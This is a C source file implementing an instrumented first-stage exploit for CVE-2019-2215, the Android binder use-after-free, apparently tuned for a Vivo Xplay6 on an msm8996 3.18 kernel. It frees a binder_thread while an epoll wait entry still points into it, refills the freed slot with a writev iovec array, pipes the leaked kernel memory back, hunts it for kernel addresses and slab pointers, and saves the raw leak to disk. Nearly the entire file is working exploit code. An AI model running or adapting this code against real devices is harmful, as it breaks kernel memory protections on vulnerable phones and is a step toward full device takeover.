#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <ctype.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sched.h>

/* CVE-2019-2215 stage 1 (leak) for Xplay6 / msm8996 3.18.20, instrumented.
 *
 * Constants measured on our own Image (art/ledger-20261013.md S32):
 *   sizeof(binder_thread)=0x128 -> kmalloc-512; 25*sizeof(iovec)=400 -> kmalloc-512
 *   thread->wait = +0x48 -> slot 0x48 = wait.lock = iovec[4].iov_len
 *                        -> slot 0x50 = wait.head.next = iovec[5].iov_base
 *                        -> slot 0x58 = wait.head.prev = iovec[5].iov_len
 *   arm64 3.18 ticket spinlock idle value after lock+unlock = 0x10001
 *
 * Instrumentation: every iovec entry reads from its OWN marked block, so the byte
 * values in the delivered pipe stream identify which entry the kernel was
 * copying when. Any byte that is not a marker = kernel data = the leak.
 */
#define PAGE          0x1000
#define UAF_SPINLOCK  0x10001UL
#define IOVEC_ARRAY_SZ   25
#define WAITQUEUE_OFFSET 0x48
#define WQ              (WAITQUEUE_OFFSET / 16)
#define BINDER_THREAD_EXIT 0x40046208u

#define BLK           0x11000        /* per-entry block: big enough for 0x10001 reads */
#define TX_MAP        (1 << 20)      /* binder mmap region for the outgoing parcel */
#define MARK(j)       (0x10 + (j))

/* uapi (drivers/staging/android/uapi/binder.h of this very tree) */
typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code;
    uint32_t flags;
    int32_t  sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union { struct { binder_uintptr_t buffer; binder_uintptr_t offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};
#define BINDER_WRITE_READ        _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION           _IOW('c', 0, struct binder_transaction_data)

static void pin0(void) {
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static ssize_t read_loop(int fd, char *buf, size_t cap) {
    size_t got = 0;
    while (got < cap) {
        ssize_t n = read(fd, buf + got, cap - got);
        if (n < 0) { if (errno == EINTR) continue; perror("read"); break; }
        if (n == 0) break;
        got += n;
        printf("    read: +%zd got=%zu\n", n, got);
    }
    return got;
}

static ssize_t write_loop(int fd, const char *buf, size_t len) {
    size_t done = 0;
    while (done < len) {
        ssize_t n = write(fd, buf + done, len - done);
        if (n < 0) { if (errno == EINTR) continue; perror("write"); break; }
        done += n;
        printf("    fwd: +%zd done=%zu\n", n, done);
    }
    return done;
}

/* binder_poll() only registers the epoll wait entry on &thread->wait when
 * wait_for_proc_work is false, i.e. when thread->transaction_stack != NULL ||
 * !list_empty(&thread->todo) || thread->return_error != BR_OK.  An idle client
 * thread otherwise lands on &proc->wait, which is never freed here -- that is why
 * the first attempts corrupted nothing.  A BC_TRANSACTION to a nonexistent handle
 * runs binder_transaction()'s shared error tail:
 *     BUG_ON(thread->return_error != BR_OK);
 *     thread->return_error = return_error;          (BR_DEAD_REPLY / -ENOSPC)
 * which leaves transaction_stack == NULL, so binder_free_thread()'s transaction
 * walk (and its BUG()) is never entered and kfree(thread) is unconditional.
 */
static void probe_bc(int unused_fd)
{
    char payload[8] = { 0 };
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    char wbuf[4 + 128];
    unsigned int s;
    int fd, rc;
    uint32_t cmd;

    (void)unused_fd;
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0x1337;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;

    /* Positive control: BC_ENTER_LOOPER = _IO('c',12) = 0x630c was read out of
     * binder_thread_write()'s own compare constants, so it must be accepted. */
    cmd = 0x630c;
    fd = open("/dev/binder", O_RDONLY);
    memset(wbuf, 0, sizeof wbuf);
    memcpy(wbuf, &cmd, 4);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = 4;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    printf("  positive control BC_ENTER_LOOPER(0x630c): rc=%d errno=%d consumed=%llu\n",
           rc, errno, (unsigned long long)bwr.write_consumed);
    close(fd);

    printf("  probing driver's sizeof(binder_transaction_data) via BC_TRANSACTION nr=0,type='c'\n");
    for (s = 8; s <= 128; s += 8) {
        cmd = (1u << 30) | (s << 16) | ((uint32_t)'c' << 8) | 0;
        fd = open("/dev/binder", O_RDONLY);
        memset(wbuf, 0, sizeof wbuf);
        memcpy(wbuf, &cmd, 4);
        memcpy(wbuf + 4, &tr, sizeof tr < s ? sizeof tr : (size_t)s);
        memset(&bwr, 0, sizeof bwr);
        bwr.write_size = 4 + s;
        bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
        printf("    size=%3u cmd=%08x rc=%d errno=%d consumed=%llu%s\n", s, cmd, rc, errno,
               (unsigned long long)bwr.write_consumed,
               (rc == 0 || errno != EINVAL) ? "   <== RECOGNISED" : "");
        close(fd);
    }
}

/* binder_poll()'s control flow, read out of OUR binary (binder_poll @ ffffffc0009f5404):
 *   thread = binder_get_thread(proc)
 *   wait_for_proc_work = thread->transaction_stack == NULL        ([thread+0x28])
 *                     && list_empty(&thread->todo)                ([thread+0x30])
 *                     && thread->return_error == BR_OK             ([thread+0x40], 0x7201)
 *   if (wait_for_proc_work) { if (has_proc_work) return POLLIN;  poll_wait(filp, proc+0xd0) }
 *   else                    { if (has_thread_work) return POLLIN; poll_wait(filp, thread+0x48) }
 * So the epoll entry only lands on &thread->wait -- the object BINDER_THREAD_EXIT
 * frees -- when the todo list is empty AND return_error is BR_OK AND
 * transaction_stack is non-NULL with to_proc set, i.e. exactly one outstanding
 * synchronous transaction awaiting its reply.  (return_error != BR_OK, my first
 * idea, also makes binder_has_thread_work() true, so poll_wait is skipped.)
 * Sending to handle 0 uses the global context-manager node, so no peer setup is
 * needed; binder_free_thread() clears t->from, so the late reply takes the
 * BR_DEAD_REPLY path instead of touching the freed thread.
 */
static int arm_pending_tx(int fd, void *map)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16];
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    uint32_t cmd = BC_TRANSACTION;
    int rc;

    (void)map;
    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;                    /* the context manager */
    tr.code = 2;                             /* check_service */
    tr.flags = 0;                            /* synchronous -> transaction_stack stays */
    tr.data_size = sizeof payload;
    tr.offsets_size = 0;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;   /* read from user heap */

    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    printf("  arm tx: rc=%d errno=%d wconsumed=%llu\n", rc, errno,
           (unsigned long long)bwr.write_consumed);
    if (rc)
        return rc;

    /* binder_transaction() queues a BINDER_WORK_TRANSACTION_COMPLETE into the
     * *sender's* todo for every transaction, so right after the send
     * binder_has_thread_work() is true and poll_wait() would be skipped.  Reading
     * now consumes that BR_TRANSACTION_COMPLETE (and clears
     * BINDER_LOOPER_STATE_NEED_RETURN, the third term of has_thread_work), leaving
     * the only state that registers on &thread->wait: empty todo + non-NULL
     * transaction_stack.  If the reply got here first we lost the race and the
     * read returns BR_REPLY instead -- that round is then reported as unusable. */
    /* Read until the queued BR_TRANSACTION_COMPLETE (0x7206) has been consumed.
     * The first read on a fresh thread returns BR_NOOP (0x720c) because
     * BINDER_LOOPER_STATE_NEED_RETURN is set, and it stops there -- so one read is
     * not enough.  After the complete is gone the todo is empty while
     * transaction_stack is still set, which is the only state where
     * binder_poll() calls poll_wait() on &thread->wait. */
    /* Read until the queued BR_TRANSACTION_COMPLETE (0x7206) has been consumed but
     * WITHOUT eating a BR_REPLY that may have landed in the same batch: after a
     * complete-only read the thread is in the only state where binder_poll() calls
     * poll_wait() on &thread->wait (todo empty, transaction_stack set,
     * return_error BR_OK, NEED_RETURN cleared by this very read).  A first read on a
     * fresh thread also emits BR_NOOP (0x720c) for NEED_RETURN and then keeps
     * walking the todo in the same syscall, so both can arrive in one batch -- hence
     * parse the stream instead of looking at the first dword only. */
    {
        int attempt_no;
        for (attempt_no = 0; attempt_no < 3; attempt_no++) {
            char rbuf[256];
            struct binder_write_read bwr2;
            size_t off = 0;
            int got_complete = 0, got_reply = 0;

            memset(rbuf, 0, sizeof rbuf);
            memset(&bwr2, 0, sizeof bwr2);
            bwr2.read_size = sizeof rbuf;
            bwr2.read_buffer = (binder_uintptr_t)(uintptr_t)rbuf;
            errno = 0;
            rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
            off = 0;
            while (off + 4 <= (size_t)bwr2.read_consumed) {
                uint32_t cmd;
                memcpy(&cmd, rbuf + off, 4);
                off += 4;
                if (cmd == 0x7206)
                    got_complete = 1;
                else if (cmd == 0x80407203 || cmd == 0x80407202) {
                    got_reply = 1;
                    off += 64;
                }
            }
            printf("  drain %d: rc=%d errno=%d rconsumed=%llu complete=%d reply=%d\n",
                   attempt_no, rc, errno, (unsigned long long)bwr2.read_consumed,
                   got_complete, got_reply);
            if (rc)
                return rc;
            if (got_complete && !got_reply)
                return 0;          /* ideal state: ADD right now */
            if (got_reply)
                return -1;         /* reply already consumed -> stack cleared */
        }
        return -1;
    }
}

/* Ground truth on whether BINDER_THREAD_EXIT really returned our binder_thread to
 * the allocator: the driver's own debugfs node lists the live threads. */
static void dump_threads(const char *tag)
{
    char path[64], buf[8192];
    ssize_t n;
    char *p;
    int fd, shown = 0;

    snprintf(path, sizeof path, "/sys/kernel/debug/binder/proc/%d", getpid());
    fd = open(path, O_RDONLY);
    if (fd < 0) { printf("  [%s] debugfs open failed: %s\n", tag, strerror(errno)); return; }
    n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0) { printf("  [%s] debugfs read -> %zd\n", tag, n); return; }
    buf[n] = 0;
    printf("  [%s] %zd bytes:\n", tag, n);
    p = buf;
    while (*p && shown < 24) {
        char *e = strchr(p, '\n');
        if (e) *e = 0;
        if (strstr(p, "thread") || strstr(p, "transaction") || strstr(p, "pending") ||
            strstr(p, "await") || strstr(p, "proc ")) {
            printf("     %s\n", p);
            shown++;
        }
        if (!e) break;
        p = e + 1;
    }
}

/* The delivered stream is self-describing: remove_wait_queue's __list_del wrote
 * slot+0x50 into BOTH iov[5].iov_base and iov[5].iov_len of the kernel's copy of
 * my array, and the copy's SOURCE address is that iov_base value.  So the first
 * two words of the window equal the window's own source address, which yields the
 * absolute VA of my slot -- and therefore of every 512-byte neighbour, free or not.
 * Requires: v == next word, v inside the linear map, and (v - 0x50) 512-aligned. */
static void report_window(const char *stream, size_t got)
{
    size_t i;
    unsigned long s = 0;
    size_t w = (size_t)-1;

    for (i = 0; i + 16 <= got; i += 8) {
        unsigned long a, b;
        memcpy(&a, stream + i, 8);
        memcpy(&b, stream + i + 8, 8);
        if (a == b && a >= 0xffffffc000000000UL && a < 0xffffffd000000000UL &&
            (a - 0x50UL) % 512 == 0) {
            s = a; w = i;
            break;
        }
    }
    if (w == (size_t)-1) {
        /* Fallback: seg4's iov_len IS the corrupted lock value, so the window's
         * expected offset is 0x1000 + that value.  Show what is really there. */
        unsigned long locklen = 0, e1 = 0, e2 = 0;
        size_t exp;
        printf("  window: no paired pointer; ");
        if (got > 0x1008) memcpy(&locklen, stream + 0x1000, 8);
        exp = 0x1000 + (size_t)locklen;
        printf("lock@+0x1000=%#lx -> expected window+%zu\n", locklen, exp);
        if (exp + 64 <= got) {
            int k;
            for (k = 0; k < 8; k++) {
                unsigned long v;
                memcpy(&v, stream + exp + k * 8, 8);
                if (k == 0) e1 = v;
                if (k == 1) e2 = v;
                printf("      +%02d %#018lx%s\n", k * 8, v,
                       (v >= 0xffffffc000000000UL && v < 0xffffffd000000000UL)
                       ? "   <== linear map" : "");
            }
            if (e1 >= 0xffffffc000000000UL && e1 < 0xffffffd000000000UL &&
                (e1 - 0x50) % 512 == 0)
                printf("      single-pointer hit: slotVA=%#lx (paired=%s)\n",
                       e1 - 0x50, e1 == e2 ? "yes" : "no");
        } else {
            printf("      (delivered only %zu bytes: window never arrived)\n", got);
        }
        return;
    }
    printf("  window: S=%#lx at stream+%zu  slotVA=%#lx  page=%#lx  phys=%#lx (%.2f GB)\n",
           s, w, s - 0x50, s & ~0xfffUL,
           s - 0xffffffc000000000UL + 0x80000000UL,
           (double)(s - 0xffffffc000000000UL + 0x80000000UL) / 1073741824.0);

    /* Map the objects we can actually see: a free object's first word is SLUB's
     * next pointer, which for these caches sits at offset 0 (no SLUB debug on this
     * build).  Print each 512-aligned address and label it. */
    {
        unsigned long page = s & ~0xfffUL;
        unsigned long o;
        int nf = 0, nl = 0;
        for (o = page; o < page + 0x1000; o += 512) {
            long off = (long)o - (long)s;
            unsigned long v;
            if (off < 0 || (size_t)off + 8 > got - w) continue;
            memcpy(&v, stream + w + off, 8);
            if (v >= page && v < page + 0x1000 && v % 512 == 0) {
                printf("    obj %#lx: next=%#lx  <-- FREE (offset 0 confirmed)\n", o, v);
                nf++;
            } else {
                nl++;
            }
        }
        printf("    visible objects: %d live/other, %d with an in-page next pointer\n", nl, nf);
    }
}

/* One attempt: returns delivered byte count, fills stream[] */
static int xep[16];
static int nxep;
static int attempt(int epfd, char *fill, char *stream, size_t *out_len, size_t cap)
{
    struct iovec iov[IOVEC_ARRAY_SZ];
    struct epoll_event ev = { .events = EPOLLIN };
    int pipefd[2] = { -1, -1 }, leakPipe[2] = { -1, -1 };
    size_t total = 0;
    int j, fd, rc = -1;
    pid_t pid;
    ssize_t b;
    void *map;

    nxep = 0;
    fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
    if (fd < 0) { perror("open binder"); return -1; }
    /* binder_mmap() refuses writable mappings on this build (EPERM); Android clients
     * only ever map it PROT_READ|MAP_SHARED, and the outgoing parcel is read from
     * ordinary user memory, so a read-only map is enough to give proc->alloc a pool. */
    map = mmap(NULL, TX_MAP, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { perror("mmap binder"); close(fd); return -1; }

    /* Full-coverage instrumentation, with one exception: slot 0x48 IS iovec[4].iov_len
     * and that is the wait queue's ticket spinlock (head in the low 16 bits, tail in
     * the high 16 -- proven by this round: setting it to 0x1000 made head != tail, so
     * remove_wait_queue()'s spin_lock_irqsave spun forever).  It must start at 0
     * (= unlocked); after one lock/unlock cycle the kernel leaves 0x00010001 there,
     * which is why poc98 calls it UAF_SPINLOCK. */
    memset(iov, 0, sizeof iov);
    iov[WQ - 1].iov_base = fill + (WQ - 1) * BLK; iov[WQ - 1].iov_len = 0x1000;
    iov[WQ].iov_base     = fill + WQ * BLK;       iov[WQ].iov_len = 0;        /* the spinlock */
    iov[WQ + 1].iov_base = fill + (WQ + 1) * BLK; iov[WQ + 1].iov_len = 0x4000;  /* the leak window */
    iov[WQ + 2].iov_base = fill + (WQ + 2) * BLK; iov[WQ + 2].iov_len = UAF_SPINLOCK;
    for (j = 0; j < IOVEC_ARRAY_SZ; j++)
        total += iov[j].iov_len;

    if (arm_pending_tx(fd, map)) goto out;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { perror("epoll_add"); goto out; }
    /* Extra waiters on the SAME wait head, so the child's single unlink leaves `next`
     * pointing at another eppoll_entry inside that slab page: readv's base then lands in
     * the ep-poll cache, where each neighbouring entry's wait.private == our task_struct.
     * (With only one waiter the unlink is the self-pointer case -> we just read back our
     * own iovec copy, which is what every earlier round actually delivered.) */
    {
        const char *e = getenv("XEPOLL");
        int want = e ? atoi(e) : 0, k;   /* default 0 = the proven single-waiter geometry (clobber depends on it) */
        for (k = 0; k < want; k++) {
            int x = epoll_create(8);
            if (x < 0) { perror("epoll_create x"); break; }
            /* binder_poll only reaches poll_wait() while has_thread_work() is false;
             * the previous ADD's own read/return_error bookkeeping can flip that, so
             * re-arm the exact pending state (sync txn out, TRANSACTION_COMPLETE
             * consumed, REPLY untouched) before every registration. */
            if (arm_pending_tx(fd, map)) { printf("  re-arm failed at %d\n", k); close(x); break; }
            if (epoll_ctl(x, EPOLL_CTL_ADD, fd, &ev)) { perror("epoll_add x"); close(x); break; }
            xep[nxep++] = x;
        }
        printf("  extra waiters registered on the same head: %d\n", nxep);
    }
    if (pipe(pipefd) || pipe(leakPipe)) { perror("pipe"); goto out; }
    j = fcntl(pipefd[0], F_SETPIPE_SZ, PAGE);
    printf("  pipefd size=%d\n", j);
    j = fcntl(leakPipe[1], F_SETPIPE_SZ, 0x20000);
    printf("  leakPipe size=%d errno=%d\n", j, errno);
    if (j < 0 && errno != EINVAL) { perror("F_SETPIPE_SZ"); goto out; }

    pid = fork();
    if (pid < 0) { perror("fork"); goto out; }
    if (pid == 0) {
        size_t got = 0;
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(pipefd[1]);
        close(leakPipe[0]);
        sleep(1);
        printf("CHILD: DEL now\n");
        alarm(4);            /* a spin inside remove_wait_queue must not wedge CPU0 */
        {
            const char *d = getenv("DELI");
            int di = d ? atoi(d) : -1;   /* -1 = the original epfd; >=0 = one of xep[] */
            int del_fd = (di >= 0 && di < nxep) ? xep[di] : epfd;
            printf("CHILD: DEL from %d (deli=%d, nxep=%d)\n", del_fd, di, nxep);
            if (epoll_ctl(del_fd, EPOLL_CTL_DEL, fd, &ev)) { perror("child epoll_del"); _exit(10); }
        }
        alarm(0);
        printf("CHILD: DEL returned\n");
        got = read_loop(pipefd[0], stream, cap);
        close(pipefd[0]);
        close(fd);
        printf("CHILD: drained %zu\n", got);
        write_loop(leakPipe[1], stream, got);
        close(leakPipe[1]);
        _exit(0);
    }
    close(pipefd[0]);
    close(leakPipe[1]);
    leakPipe[1] = -1;

    dump_threads("pre-exit");
    alarm(25);
    errno = 0;
    if (ioctl(fd, BINDER_THREAD_EXIT, NULL)) { perror("BINDER_THREAD_EXIT"); goto out; }
    b = writev(pipefd[1], iov, IOVEC_ARRAY_SZ);
    printf("  writev -> %zd (expect %zu) errno=%d\n", b, total, errno);
    close(pipefd[1]);
    *out_len = read_loop(leakPipe[0], stream, cap);
    alarm(0);
    {
        int st = 0;
        waitpid(pid, &st, 0);
        printf("  delivered %zu bytes, child status=%d\n", *out_len, st);
    }
    dump_threads("post");
    rc = 0;
out:
    if (map != MAP_FAILED)
        munmap(map, TX_MAP);
    if (rc) {
        if (leakPipe[0] >= 0) close(leakPipe[0]);
        if (leakPipe[1] >= 0) close(leakPipe[1]);
        if (pipefd[1] >= 0) close(pipefd[1]);
    }
    if (fd >= 0) close(fd);
    return rc;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 1;
    size_t cap = 0x40000;
    char *fill, *stream;
    int epfd, r;

    setvbuf(stdout, NULL, _IONBF, 0);
    fill = calloc(IOVEC_ARRAY_SZ, BLK);
    stream = calloc(1, cap);
    if (!fill || !stream) { perror("alloc"); return 1; }
    for (int j = 0; j < IOVEC_ARRAY_SZ; j++) memset(fill + j * BLK, MARK(j), BLK);

    pin0();
    epfd = epoll_create(1000);
    printf("fill=%p stream=%p  clean answer = %d runs of 0x1000, markers 0x%02x..0x%02x\n",
           (void *)fill, (void *)stream, IOVEC_ARRAY_SZ, MARK(0), MARK(IOVEC_ARRAY_SZ - 1));
    if (argc > 2 && !strcmp(argv[2], "probe"))
        probe_bc(0);

    for (r = 0; r < rounds; r++) {
        size_t got = 0;
        printf("--- round %d ---\n", r);
        if (attempt(epfd, fill, stream, &got, cap)) { printf("attempt failed\n"); continue; }
        {
            size_t i = 0, foreign = 0, nruns = 0;
            printf("  expected clean runs: e[3]=0x%02x 4096 | e[4]=0x%02x 65537(lock mutated) | e[5]=0x%02x 16384\n",
                   MARK(3), MARK(4), MARK(5));
            while (i < got) {
                size_t j = i;
                int v = (unsigned char)stream[i];
                while (j < got && (unsigned char)stream[j] == v) j++;
                int is_mark = (v >= MARK(0) && v <= MARK(IOVEC_ARRAY_SZ - 1));
                if (nruns < 14)
                    printf("    [%06zu..%06zu] byte=%02x len=%zd %s\n", i, j, v, j - i,
                           is_mark ? "marker" : "*** NON-MARKER (kernel data) ***");
                if (!is_mark) foreign += j - i;
                nruns++;
                i = j;
            }
            printf("  runs=%zu non-marker=%zu verdict=%s\n", nruns, foreign,
                   foreign ? "LEAKED" : (nruns == 3 ? "clean(3 runs)" : "CHECK RUN LENGTHS"));
            {
                /* strict criterion: only a real kernel VA counts. Non-marker bytes
                 * alone (zeros of my own buffer) used to print LEAKED, which is how
                 * a miss was read as a hit. */
                size_t q, kva = 0;
                for (q = 0; q + 8 <= got; q += 8) {
                    unsigned long v;
                    memcpy(&v, stream + q, 8);
                    if (v >= 0xffffff8000000000UL)  /* canonical for VA_BITS=39: PAGE_OFFSET-1GB band; >=0xffff80.. also matches struct-page flag words and gave a FALSE 'REAL LEAK' (ledger 168) */
                        kva++;
                }
                printf("  strict: kernel-VA qwords=%zu -> %s\n", kva,
                       kva ? "REAL LEAK" : "no kernel pointer: NOT a leak");
                report_window(stream, got);
            }
            if (foreign) {
                int shown = 0;
                FILE *f;
                printf("  --- kernel-looking qwords ---\n");
                for (size_t q = 0; q + 8 <= got && shown < 40; q += 8) {
                    unsigned long v;
                    memcpy(&v, stream + q, 8);
                    if (v >= 0xffffff8000000000UL)  /* canonical for VA_BITS=39: PAGE_OFFSET-1GB band; >=0xffff80.. also matches struct-page flag words and gave a FALSE 'REAL LEAK' (ledger 168) */ {
                        printf("    [%05zu] %016lx%s\n", q, v,
                               (v & 0x3fffUL) == 0 ? "   <16K-aligned: kernel stack / thread_info?>" : "");
                        shown++;
                    }
                }
                f = fopen("/data/local/tmp/broot.leak", "wb");
                if (f) { fwrite(stream, 1, got, f); fclose(f); printf("  saved raw stream (%zu)\n", got); }
            }
        }
    }
    return 0;
}
